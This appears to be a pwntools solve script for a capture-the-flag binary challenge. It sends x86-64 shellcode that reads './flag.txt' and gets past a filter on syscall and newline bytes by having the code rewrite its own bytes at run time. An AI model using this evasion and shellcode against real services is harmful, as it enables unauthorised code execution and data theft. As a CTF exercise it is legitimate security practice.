from pwn import *

def wrapper(sc):
    bad_sc = bytearray(asm(sc))
    good_sc = asm("mov r10, rax")
    bad_offsets = []

    for i in range(len(bad_sc)):
        if bad_sc[i] in [0x05, 0x0f, 0x80, 0xcd, 0xa]:
            bad_offsets.append(i)
            bad_sc[i] -= 1

    for b in bad_offsets:
        good_sc += asm(f"inc byte ptr [r10+{b}]")

    a = asm(f"add r10, {5+len(good_sc)}")
    o = len(a) + len(good_sc)
    q = 0
    if o in [0x05, 0x0f, 0x80, 0xcd, 0xa]:
        o += 1
        q = 1
    good_sc = b"\x90"*q + asm(f"add rax, {o}") + good_sc + bad_sc
    return good_sc

context.terminal = ["tmux", "neww"]
context.binary = ELF("./app/chall")
p = remote("localhost", 21237)
# p = process("./chall")

sc = """
push 0x1010101 ^ 0x7478
xor dword ptr [rsp], 0x1010101
mov rax, 0x742e67616c662f2e
push rax
mov rdi, rsp
mov rax, 2
mov rsi, 0
mov rdx, 0
syscall
mov rdi, rax
mov rsi, r10
add rsi, 0xf00
mov rdx, 0x20
mov rax, 0
syscall
mov rdi, 1
mov rdx, 0x20
mov rax, 1
syscall
mov rax, 0x3c
mov rdi, 0
syscall
"""

asc = wrapper(sc)

# gdb.attach(p)

p.sendline(asc)
p.interactive()
